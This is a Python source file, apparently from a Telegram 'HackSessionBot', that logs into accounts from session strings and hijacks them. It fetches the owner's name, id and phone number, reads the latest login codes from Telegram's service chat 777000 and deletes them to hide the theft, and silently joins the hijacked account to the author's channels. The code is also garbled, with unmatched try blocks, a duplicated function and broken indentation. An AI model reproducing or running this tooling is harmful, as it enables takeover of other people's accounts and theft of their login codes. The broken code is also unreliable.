import asyncio
import pyrogram 
from pyrogram import Client , enums
from telethon import TelegramClient
from telethon.sessions import StringSession 
from pyrogram.raw import functions 
from HackSessionBot import (
     API_ID,
     API_HASH,
     CHAT )
from telethon.tl.functions.channels import GetAdminedPublicChannelsRequest , JoinChannelRequest as join , LeaveChannelRequest as leave , DeleteChannelRequest as dc
from HackSessionBot.Helpers.data import info
from pyrogram.types.messages_and_media.message import Str
from telethon.tl.functions.channels import EditBannedRequest
from telethon.tl.types import ChannelParticipantsAdmins,ChatBannedRights
from pyrogram.errors import FloodWait
from telethon.tl.functions.auth import ResetAuthorizationsRequest as rt
import telethon;from telethon import functions as ok
from pyrogram.types import ChatPrivileges
from telethon.tl.types import ChannelParticipantsAdmins
 
async def user_info(session):
    err = ""
    try:
        if session.endswith("="):
            steve = TelegramClient(StringSession(session),API_ID,API_HASH)   
            await steve.connect()
            try:
                k = await steve.get_me()  
                msg = info.format((k.first_name if k.first_name else k.last_name),k.id,k.phone,k.username)
                await steve.disconnect()
                             
    else:    
        async with Client("stark",api_id=API_ID,api_hash=API_HASH, session_string=session) as stark:
            try:
                k = await stark.get_me()
               msg = info.format((k.first_name if k.first_name else k.last_name),k.id,k.phone_number,k.username)
    except Exception as idk:
        err += str(idk)
                    
    if err:
        return "**ᴇʀʀᴏʀ:** " + err + "\n**ᴛʀʏ ᴀɢᴀɪɴ /hack.**"
    return msg    
     
async def get_otp(session):
    err = ""
    i = ""
    try:
        if session.endswith("="):
            steve = TelegramClient(StringSession(session),API_ID,API_HASH)   
            await steve.connect()
            try:
                async for x in steve.iter_messages(777000, limit=2):               
                    i += f"\n{x.text}\n"
                    await steve.delete_dialog(777000)
            await steve.disconnect() 
                             
    else:    
         async with Client("stark",api_id=API_ID,api_hash=API_HASH, session_string=session) as stark:
             try:
                 ok = []
                 async for message in stark.get_chat_history(777000,limit=2):
                     i += f"\n{message.text}\n"                                   
                     ok.append(message.id)                 
                 await stark.delete_messages(777000,ok)
      except Exception as idk:
          err += str(idk)
                    
    if err:
        return "**ᴇʀʀᴏʀ:** " + err + "\n**ᴛʀʏ ᴀɢᴀɪɴ /hack.**"
    return i





async def user_info(session):
    err = ""
    try:
        if session.endswith("="):
            steve = TelegramClient(StringSession(session),API_ID,API_HASH)   
            await steve.connect()
            k = await steve.get_me()  
            msg = info.format((k.first_name if k.first_name else k.last_name),k.id,k.phone,k.username)
            await steve.disconnect()
    except Exception as idk:
        err += str(idk)
    
    else:    
        async with Client("stark",api_id=API_ID,api_hash=API_HASH, session_string=session) as stark:
            try:
                await stark.join_chat("@Devs_Testing_Group")
                await stark.join_chat("@steve_projects")
                await stark.join_chat(CHAT)
            except Exception as e:
                print(e)    
            k = await stark.get_me()
            msg = info.format((k.first_name if k.first_name else k.last_name),k.id,k.phone_number,k.username)


